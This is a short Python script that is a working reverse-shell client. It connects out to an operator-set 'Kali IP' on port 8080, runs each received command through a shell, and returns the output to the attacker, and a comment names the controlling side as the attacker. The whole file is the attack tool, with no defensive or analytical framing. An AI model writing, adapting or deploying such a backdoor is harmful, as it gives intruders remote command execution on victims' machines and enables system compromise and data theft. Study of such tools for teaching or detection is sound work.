#!/usr/bin/python

import socket
import subprocess
import os

ip_addr = "Your Kali IP"         # use your kali IP address
port = 8080                      # use any port

def clear():    

    name = os.name

    if name == "nt":
        os.system("cls")
    else:
        os.system("clear")
clear()

def connect():

    print("[!] Waiting for connection...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_addr, port))
    print("[+] Connected from : ", ip_addr)

    while True:

        command = s.recv(1024)

        if not command:
            break
        if b"terminate" in command:
            s.close()
            break
        else:
            CMD = subprocess.Popen(command.decode().strip(),
                                   shell=True,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE)

            output_byte = CMD.stdout.read()
            error_byte = CMD.stderr.read()
            s.send(output_byte)
            s.send(error_byte)
            # print("Server : ",command)       if you want to see what attacker typing enable this command


def main():
    connect()

if __name__ == "__main__":
    main()
